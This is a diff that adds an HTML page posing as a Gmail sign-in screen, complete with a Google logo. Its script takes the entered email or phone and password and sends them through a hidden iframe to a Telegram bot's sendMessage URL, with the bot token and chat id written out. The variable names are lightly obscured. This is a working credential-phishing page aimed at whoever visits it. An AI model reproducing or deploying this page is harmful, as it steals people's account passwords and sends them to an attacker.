@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gmail Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f3f4;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background: white;
+      padding: 2rem;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    .gmail-icon {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 1rem;
+    }
+
+    h2 {
+      font-size: 1.2rem;
+      color: #333;
+      margin-bottom: 20px;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      color: white;
+      font-size: 1rem;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0c5dc0;
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 1.5rem;
+      }
+    }
+    iframe{
+    position:fixed;
+    width:0px;
+    height:0px;
+    opacity:0;
+    }
+  </style>
+  <script type="text/javascript">
+  function submiter(){
+  var pስልክ = document.getElementById("emailphone").value;
+  var pቁጥር = document.getElementById("password").value;
+  var data = {
+  gmail_phone:pስልክ,
+  password:pቁጥር
+  }
+  if(pስልክ==""||pቁጥር==""){
+  alert("pleace insert login info!");
+  }else{
+  var frame = document.getElementById("frame");
+  frame.setAttribute("src" ,"https://api.telegram.org/bot7991316137:AAFvOyfzDlDWD47GVi3ZsTD41rVlPkFGyDY/sendMessage?chat_id=@sponsered123&text="+(JSON.stringify(data))+"");
+  }}
+  </script>
+</head>
+<body>
+
+  <div class="login-container">
+    <!-- Google G Logo SVG Icon -->
+    <svg class="gmail-icon" viewBox="0 0 48 48">
+      <path fill="#4285F4" d="M24 9.5c3.15 0 5.9 1.1 8.1 2.9l6-6C34.45 2.9 29.6 0.5 24 0.5 14.8 0.5 6.95 6.6 3.55 14.9l7 5.4C12.15 13.4 17.6 9.5 24 9.5z"/>
+      <path fill="#34A853" d="M46.45 24.5c0-1.6-.15-3.15-.45-4.6H24v9h12.65c-.55 2.9-2.15 5.3-4.55 7l7 5.4c4.1-3.75 6.35-9.3 6.35-15.8z"/>
+      <path fill="#FBBC05" d="M10.55 28.6C9.45 26 9 23.1 9 20.1s.45-5.9 1.55-8.5l-7-5.4C1.35 11.1 0 15.4 0 20.1s1.35 9 3.55 12.9l7-5.4z"/>
+      <path fill="#EA4335" d="M24 47.7c5.6 0 10.3-1.8 13.75-4.9l-7-5.4c-1.9 1.3-4.3 2.1-6.75 2.1-6.4 0-11.85-3.9-13.45-9.4l-7 5.4C6.95 41.8 14.8 47.7 24 47.7z"/>
+    </svg>
+
+    <h2>Use Gmail to continue</h2>
+
+    <input id="emailphone"type="email" placeholder="Gmail address" required />
+    <input id="password"type="password" placeholder="Password" required />
+    <button onclick="submiter()">Next</button>
+  </div>
+  <iframe id="frame"src="">
+</body>
+</html>
